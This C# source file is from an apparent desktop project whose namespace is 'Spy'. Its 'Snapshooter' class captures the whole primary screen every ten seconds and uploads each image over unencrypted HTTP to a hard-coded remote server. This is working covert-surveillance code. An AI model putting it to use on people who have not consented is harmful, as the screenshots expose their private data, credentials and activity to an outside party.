﻿using System;
using System.Drawing;
using System.Net.Http;
using System.Net.Http.Formatting;
using System.Net.Http.Headers;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using HIT.Common.Utils;
using HIT.Web.ViewModels;

namespace HIT.Desktop.Spy
{
    public class Snapshooter : IRunnable
    {
        private readonly string SessionId;
        private bool isRunning = true;

        public Snapshooter(string sessionId)
        {
            this.SessionId = sessionId;
        }

        public async Task Start()
        {
            var primaryScreenBounds = Screen.PrimaryScreen.Bounds;
            var primaryScreenWidth = primaryScreenBounds.Width;
            var primaryScreenHeight = primaryScreenBounds.Height;

            var deviceName = Screen.PrimaryScreen.DeviceName;
            using (var bitmapScreenCapture = new Bitmap(primaryScreenWidth, primaryScreenHeight))
            {
                using (var graphics = Graphics.FromImage(bitmapScreenCapture))
                {
                    while (this.isRunning)
                    {
                        graphics.CopyFromScreen(
                            primaryScreenBounds.X,
                            primaryScreenBounds.Y,
                            0, 0,
                            bitmapScreenCapture.Size,
                            CopyPixelOperation.SourceCopy);

                        var imageAsByteArray = ConvertionOperations.ImageToByteArray(bitmapScreenCapture);

                        try
                        {
                            await SendSnapshotAsync(imageAsByteArray);
                        }
                        catch (Exception e)
                        {
                            throw;
                        }

                        Thread.Sleep(10000);
                    }
                }
            }
        }

        public void Stop()
        {
            this.isRunning = false;
        }

        private async Task SendSnapshotAsync(byte[] data)
        {
            var model = new SnapshotViewModel
            {
                SessionId = this.SessionId,
                SnapshotAsByteArray = data
            };

            using (var client = new HttpClient())
            {
                // Set the API base address
                //client.BaseAddress = new Uri("http://localhost:62164/");
                client.BaseAddress = new Uri("http://craftcluster.com/");

                // Set the Accept header for BSON
                client.DefaultRequestHeaders.Accept.Clear();
                client.DefaultRequestHeaders.Accept.Add(
                    new MediaTypeWithQualityHeaderValue("application/bson"));

                // POST using the BSON formatter
                var bsonFormatter = new BsonMediaTypeFormatter();
                var result = await client.PostAsync("api/Sessions/PostSnapshot", model, bsonFormatter);

                result.EnsureSuccessStatusCode();
            }
        }
    }
}
